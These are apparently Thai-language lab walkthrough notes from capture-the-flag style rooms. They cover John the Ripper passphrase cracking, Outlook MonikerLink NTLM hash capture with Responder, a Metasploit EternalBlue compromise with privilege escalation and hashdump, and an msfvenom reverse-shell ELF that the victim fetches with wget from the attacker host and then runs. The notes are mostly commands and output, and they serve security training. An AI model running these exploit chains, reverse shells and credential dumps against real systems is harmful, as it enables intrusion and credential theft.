# 1. John the Ripper (JtR)

## 1.1 แนวคิดหลัก (Core Concepts)

**John the Ripper (JtR)** คือหนึ่งในเครื่องมือถอดรหัสผ่าน (Password Cracking) ที่ได้รับความนิยมมากที่สุด หน้าที่หลักของมันคือการนำ "Hash" (ข้อมูลรหัสผ่านที่ถูกเข้ารหัส) มาเปรียบเทียบกับรายการคำศัพท์ (Wordlist) หรือใช้วิธี Incremental (Brute-force) เพื่อค้นหารหัสผ่านตัวจริง (Plaintext)

- **โหมดการทำงาน (Modes of Operation):**
    
    1. **Single Crack:** ใช้ข้อมูลจากตัว Hash เอง (เช่น Username) เพื่อเดารหัสผ่าน
        
    2. **Wordlist:** (นิยมที่สุด) ใช้ไฟล์พจนานุกรม (เช่น `rockyou.txt`) เพื่อทดสอบทีละคำ
        
    3. **Incremental (Brute-force):** พยายามทดลองทุกความเป็นไปได้ของตัวอักษร (`aaa`, `aab`, `aac`) ช้าแต่ครบถ้วน
        
- **เครื่องมือช่วย (`*2john`):** JtR ไม่สามารถอ่านไฟล์ที่เข้ารหัสได้โดยตรง มันต้องการเครื่องมือช่วยเพื่อ "ดึง" (extract) Hash ออกมาจากไฟล์เหล่านี้ก่อน เช่น `zip2john`, `rar2john`, และ `ssh2john`
    

## 1.2 โจทย์ (The Problem)

เราพบ SSH Private Key (`id_rsa`) ที่ถูกเข้ารหัสด้วย Passphrase เราไม่สามารถใช้กุญแจนี้เพื่อยืนยันตัวตนได้จนกว่าเราจะแคร็ก Passphrase นั้นได้

## 1.3 คำสั่งและเทคนิค (Commands & Techniques)

Bash

```
# 1. ใช้ ssh2john เพื่อดึง Hash ออกมาจากไฟล์ id_rsa
ssh2john id_rsa > ssh_hash.txt

# 2. ใช้ John (JtR) กับ Wordlist (rockyou.txt) เพื่อแคร็ก Hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt

# 3. (ถ้าสำเร็จ) แสดงรหัสผ่านที่แคร็กได้
john --show ssh_hash.txt
```

---

## 2. การลาดตระเวนและการเจาะระบบเบื้องต้น (Reconnaissance & Initial Exploitation) (CVE-2024-21413 - MonikerLink)

### 2.1 แนวคิดหลัก (Core Concepts)

นี่คือช่องโหว่ใน **Microsoft Outlook** ที่อนุญาตให้ผู้โจมตี "ข้าม" (bypass) คุณสมบัติความปลอดภัย **Protected View**

- **กลไก:** ผู้โจมตีสร้างลิงก์อันตรายในอีเมลที่ขึ้นต้นด้วย `file://`
    
- **ลูกเล่น (The Trick):** พวกเขาผนวกอักขระพิเศษ `!` ต่อท้ายลิงก์ (เช่น `file://[IP]/share!exploit`)
    
- **ผลกระทบ:** เมื่อเหยื่อคลิก, Outlook จะข้ามหน้าต่างแจ้งเตือนความปลอดภัยและพยายามยืนยันตัวตนกับเซิร์ฟเวอร์ของผู้โจมตี (ผ่าน SMB) ทันที ซึ่งทำให้ **NTLMv2 Hash** (ลายนิ้วมือรหัสผ่าน) ของเหยื่อรั่วไหล
    
- **เครื่องมือดักจับ (Catcher Tool):** เราใช้ `Responder` ซึ่งเป็นเครื่องมือที่ทำตัวเป็นเซิร์ฟเวอร์ SMB ปลอมเพื่อ "ดักจับ" Hash ที่รั่วออกมา
    

### 2.2 โจทย์ (The Problem)

จำลองการโจมตีโดยการตั้งค่า `Responder` ให้ดักฟัง และส่งอีเมล Phishing ที่มีลิงก์ `file://...` ไปยังเป้าหมายเพื่อดักจับ NTLMv2 Hash ของพวกเขา

### 2.3 คำสั่งและเทคนิค (Commands & Techniques)

Bash

```
# 1. (บนเครื่อง Attacker) ค้นหา Network Interface ของเรา (เช่น tun0 หรือ ens5)
ip a

# 2. (บนเครื่อง Attacker) รัน Responder เพื่อดักจับ Hash
# ต้องใช้ sudo และระบุ Interface ที่ถูกต้องด้วย -I
sudo responder -I tun0

# 3. (บนเครื่อง Attacker) รันสคริปต์ Python (PoC) เพื่อส่งอีเมลอันตราย
# (ต้องเปลี่ยน IP ในสคริปต์ให้เป็น IP ของเราก่อน)
python3 exploit.py

# 4. (บนเครื่อง Victim) คลิกลิงก์ในอีเมล

# 5. (บนเครื่อง Attacker) ตรวจสอบหน้าต่าง Responder
# เราจะเห็น NTLMv2 Hash ของเหยื่อปรากฏขึ้นมา
```

---

## 3. Metasploit Framework

### 3.1 แนวคิดหลัก (Core Concepts)

**Metasploit** คือเฟรมเวิร์กที่ใหญ่และครอบคลุมที่สุดสำหรับการทดสอบเจาะระบบ (Penetration Testing) มันรวบรวม Exploit, Payload, และเครื่องมืออื่นๆ ไว้ในแพลตฟอร์มเดียว

- **`msfconsole`:** หน้าต่างสั่งการหลัก (Command Center)
    
- **Context (บริบท):** แนวคิดที่สำคัญที่สุด (`msf6 >` คือ Prompt ส่วนกลาง; `msf6 exploit(...) >` หมายความว่าคุณกำลังอยู่ในบริบทของโมดูลนั้นๆ)
    
- **โมดูล (Modules):**
    
    - **Exploit:** โค้ดที่ใช้ประโยชน์จากช่องโหว่ (เช่น `ms17_010_eternalblue`)
        
    - **Auxiliary:** เครื่องมือช่วย (เช่น `scanner/smb/smb_version`)
        
    - **Post:** เครื่องมือที่ใช้ _หลังจาก_ เจาะระบบได้แล้ว (เช่น `shell_to_meterpreter`, `hashdump`)
        
- **Payloads (สิ่งที่จะส่งไป):**
    
    - **Reverse Shell:** (นิยมที่สุด) เหยื่อเชื่อมต่อ "กลับมา" หาคุณ (ต้องใช้ `LHOST` - IP ของคุณ)
        
    - **Bind Shell:** เหยื่อ "เปิดพอร์ต" รอให้คุณเชื่อมต่อเข้าไป (ต้องใช้ `RPORT`)
        
- **Meterpreter:** นี่คือ Payload "ระดับเทพ" ของ Metasploit มันไม่ใช่แค่ Shell ธรรมดา แต่เป็น Agent ทรงพลังที่มีฟังก์ชันขั้นสูง (เช่น `getsystem`, `hashdump`, `download`)
    
- **Database:** Metasploit สามารถเชื่อมต่อกับฐานข้อมูล (PostgreSQL) เพื่อ "บันทึก" ผลการสแกนทั้งหมด, จัดการ `Workspaces` (โปรเจกต์), และใช้ `db_nmap` เพื่อสแกนและนำเข้าข้อมูลอัตโนมัติ
    

### 3.2 โจทย์ (The Problem)

นี่คือปัญหาที่ซับซ้อนและมีหลายขั้นตอน:

1. **สแกน:** ใช้ Metasploit Database และ Nmap เพื่อลาดตระเวนเป้าหมาย
    
2. **เจาะระบบ:** ใช้ `ms17_010_eternalblue` เพื่อเจาะระบบเป้าหมาย (`10.10.98.199`)
    
3. **พบอุปสรรค:** Shell เริ่มต้นที่ได้มา (`Session 1`) มีสิทธิ์ไม่เพียงพอ (`reg save` ล้มเหลว)
    
4. **อัปเกรด:** เราจำเป็นต้อง "อัปเกรด" Shell ธรรมดาให้เป็น Meterpreter Session
    
5. **ยกระดับสิทธิ์ (PrivEsc):** เมื่อเข้าไปใน Meterpreter (`Session 2`), ใช้ `getsystem` เพื่อให้ได้สิทธิ์ System สูงสุด
    
6. **เก็บเกี่ยว (Loot):** ใช้ `hashdump` เพื่อดึง NTLM Hash ของผู้ใช้ `pirate`
    

### 3.3 คำสั่งและเทคนิค (Commands & Techniques)

#### การตั้งค่าฐานข้อมูล (Database Setup)

Bash

```
# (ตั้งค่าครั้งเดียวใน Kali) สตาร์ทฐานข้อมูล
sudo systemctl start postgresql

# (ตั้งค่าครั้งเดียวใน Kali) เริ่มต้นฐานข้อมูล Metasploit
sudo msfdb init

# (ใน msfconsole) ตรวจสอบสถานะ
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.

# สร้างและสลับไปยัง Workspace (โปรเจกต์) ใหม่
msf6 > workspace -a THM_Project
```

#### การสแกน (Scanning)

Bash

```
# ใช้ db_nmap เพื่อสแกนและนำเข้าผลลัพธ์ลง DB อัตโนมัติ
msf6 > db_nmap -sV -p- 10.10.98.199

# ดูโฮสต์ทั้งหมดในโปรเจกต์
msf6 > hosts

# ดูบริการ/พอร์ต ทั้งหมด
msf6 > services
```

#### การเจาะระบบ (Exploitation)

Bash

```
# ค้นหาและเลือก Exploit
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# ตั้งค่าเป้าหมาย (เหยื่อ)
msf6 exploit(...) > set RHOSTS 10.10.98.199

# ตั้งค่า Payload (หากต้องการ Reverse Shell)
msf6 exploit(...) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 10.4.10.128

# ยิง!
msf6 exploit(...) > exploit
...
C:\Windows\system32>
```

#### การจัดการ Session (Session Management) (สำคัญมาก!)

Bash

```
# "ย่อ" (Background) Shell ปัจจุบัน (Session 1) เพื่อกลับไปที่ msfconsole
C:\Windows\system32> ^Z  (กด Ctrl + Z)
Background session 1? [y/N]  y

# ดู Session ทั้งหมดที่ยัง Active
msf6 exploit(...) > sessions -l

  Id  Name  Type               Information
  --  ----  ----               -----------
  1         shell x64/windows  Shell Banner: ...

# "กลับเข้าไป" (Interact) ใน Session เพื่อใช้งานต่อ
msf6 exploit(...) > sessions -i 1
[*] Starting interaction with 1...
C:\Windows\system32>
```

#### การอัปเกรดและยกระดับสิทธิ์ (Upgrading & Privilege Escalation)

Bash

```
# (หลังจากย่อ Session 1)
# ใช้โมดูลอัปเกรด Shell
msf6 exploit(...) > use post/multi/manage/shell_to_meterpreter

# บอกโมดูลว่าเราจะอัปเกรด Session ไหน
msf6 post(...) > set SESSION 1

# ตั้งค่า LHOST/LPORT อีกครั้งสำหรับ Meterpreter ที่จะเชื่อมต่อกลับมา
msf6 post(...) > set LHOST 10.4.10.128
msf6 post(...) > set LPORT 4434

# สั่งรันการอัปเกรด
msf6 post(...) > run
[*] Sending stage...
[*] Meterpreter session 2 opened...

# เข้าไปใน Session 2 (Meterpreter)
msf6 post(...) > sessions -i 2
meterpreter > 

# ยกระดับสิทธิ์เป็น SYSTEM
meterpreter > getsystem
...got system...

# ดึง Hash ทั้งหมด!
meterpreter > hashdump
Administrator:500:aad3...:31d6...
pirate:1001:aad3...:8ce9a3ebd1647fcc5e04025019f4b875:::

# ได้คำตอบ (NTLM Hash ของ pirate)
# 8ce9a3ebd1647fcc5e04025019f4b875
```

## 4. Msfvenom และ Exploit Handler

### 4.1 แนวคิดหลัก (Core Concepts)

**Msfvenom** คือเครื่องมือใน Metasploit Framework ที่ใช้สร้าง **Payloads แบบ Standalone**

หน้าที่หลักของมันคือการสร้างไฟล์อันตราย (เช่น `.exe`, `.php`, `.elf`) ซึ่งเมื่อเหยื่อรันไฟล์นั้น มันจะเชื่อมต่อกลับมาหาผู้โจมตี, มอบ Shell หรือ Meterpreter Session

**Exploit Handler (`exploit/multi/handler`)** เนื่องจาก `Msfvenom` สร้างแค่ _ไฟล์_ Payload, มันไม่ได้ _ดักฟัง_ การเชื่อมต่อ เราจึงต้องใช้ `exploit/multi/handler` ใน `msfconsole` เพื่อทำหน้าที่เป็น "ตัวรับ" (Listener) หรือ "ตัวดักจับ" (Catcher)

> **กฎทอง:** การตั้งค่า `PAYLOAD`, `LHOST`, และ `LPORT` ใน Handler **ต้องตรงกันเป๊ะ** กับการตั้งค่าที่ใช้สร้าง Payload ด้วย `Msfvenom`

### 4.2 โจทย์ (The Problem)

นี่คือปัญหาที่ซับซ้อนหลายขั้นตอนซึ่งจำลองการเจาะระบบแบบ Manual:

1. **สร้าง Payload:** สร้างไฟล์ `.elf` (สำหรับ Linux) ที่มี Meterpreter reverse shell
    
2. **ตั้งค่า Listener:** เปิด `msfconsole` และตั้งค่า `exploit/multi/handler` ให้รอการเชื่อมต่อ
    
3. **โอนย้ายไฟล์:** ย้ายไฟล์ `.elf` ที่สร้างขึ้นจากเครื่องผู้โจมตีไปยังเครื่องเหยื่อ
    
4. **สั่งรัน (Execute):** รันไฟล์ `.elf` บนเครื่องเหยื่อเพื่อให้มันเชื่อมต่อกลับมา
    
5. **ดึง Hashes:** เมื่อได้ Meterpreter Session แล้ว, ใช้โมดูล post-exploitation (`post/linux/gather/hashdump`) เพื่อดึง password hashes ของผู้ใช้อื่นในระบบ
    

### 4.3 คำสั่งและเทคนิค (Commands & Techniques) (Walkthrough ฉบับเต็ม)

นี่คือขั้นตอนทั้งหมด (แยกตามหน้าต่าง Terminal) ที่คุณได้ทำเพื่อแก้โจทย์นี้

#### Terminal 1: (เครื่อง Attacker) - สร้าง Payload

Bash

```
# 1. ค้นหา IP ผู้โจมตี (LHOST)
# (สมมติว่า IP ของเราคือ 10.4.10.128)
ip a

# 2. สร้าง .elf payload ด้วย Msfvenom
# -p = Payload ที่จะใช้
# LHOST = IP ของเรา
# LPORT = พอร์ตที่เราจะใช้ดักฟัง
# -f = Format (elf คือไฟล์ executable สำหรับ Linux)
# -o = Output (ชื่อไฟล์ที่จะบันทึก)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.4.10.128 LPORT=4444 -f elf -o shell.elf

# ผลลัพธ์:
# [-] No platform was selected...
# [-] No arch selected...
# Payload size: 130 bytes
# Final size of elf file: 250 bytes
# Saved as: shell.elf
```

#### Terminal 2: (เครื่อง Attacker) - ตั้งค่า Handler

Bash

```
# 1. เริ่ม Metasploit Console
msfconsole -q

# 2. ใช้โมดูล multi-handler
msf6 > use exploit/multi/handler

# 3. ตั้งค่า payload (ต้องตรงกับ Msfvenom)
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp

# 4. ตั้งค่า LHOST (ต้องตรง)
msf6 exploit(multi/handler) > set LHOST 10.4.10.128

# 5. ตั้งค่า LPORT (ต้องตรง)
msf6 exploit(multi/handler) > set LPORT 4444

# 6. "run" (ตอนนี้ Metasploit จะเริ่มรอการเชื่อมต่อ)
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.4.10.128:4444
```

#### Terminal 3: (เครื่อง Attacker) - เว็บเซิร์ฟเวอร์ (สำหรับโอนไฟล์)

Bash

```
# 1. ไปยังโฟลเดอร์ที่มีไฟล์ shell.elf
# (ต้องเป็น Terminal ใหม่; ห้ามปิด Terminal 1 หรือ 2)

# 2. เริ่มเว็บเซิร์ฟเวอร์อย่างง่ายบนพอร์ต 9000
python3 -m http.server 9000
```

#### Terminal 4: (เครื่อง Victim) - ดาวน์โหลดและสั่งรัน

Bash

```
# 1. ล็อกอินเข้าเครื่องเหยื่อ (murphy / 1q2w3e4r) และยกระดับสิทธิ์
sudo su

# 2. ไปยังไดเรกทอรีที่เขียนได้ (เช่น /tmp)
cd /tmp

# 3. ดาวน์โหลด .elf payload จากเครื่องผู้โจมตี
wget http://10.4.10.128:9000/shell.elf

# 4. ให้สิทธิ์ในการรัน (Execute permission)
chmod +x shell.elf

# 5. สั่งรัน payload!
./shell.elf
```

#### กลับไปที่ Terminal 2: (เครื่อง Attacker) - ได้รับ Session!

Bash

```
# (หน้าต่างนี้จะอัปเดตทันทีที่เหยื่อรันไฟล์)
[*] Started reverse TCP handler on 10.4.10.128:4444
[*] Meterpreter session 1 opened (10.4.10.128:4444 -> 10.10.139.146:...)
meterpreter > 
```

#### การทำงานหลังเจาะระบบ (Post-Exploitation) (การดึง Hashes)

Bash

```
# 1. "ย่อ" (Background) Meterpreter session เพื่อกลับไปที่ msfconsole
meterpreter > background
[*] Backgrounding session 1...

# 2. ใช้โมดูลดึง hash ของ Linux
msf6 exploit(multi/handler) > use post/linux/gather/hashdump

# 3. บอกโมดูลว่าจะรันบน Session ไหน
msf6 post(linux/gather/hashdump) > set SESSION 1
SESSION => 1

# 4. สั่งรัน
msf6 post(linux/gather/hashdump) > run

# 5. ได้รับ hashes ของผู้ใช้ทั้งหมด
[+] murphy:$6$qK0Kt4UO$HuCr...
[+] claire:$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002...
[*] Post module execution completed

# 6. คัดลอก hash ของ "other user" (claire) เพื่อเป็นคำตอบ
# คำตอบ: $6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0
```
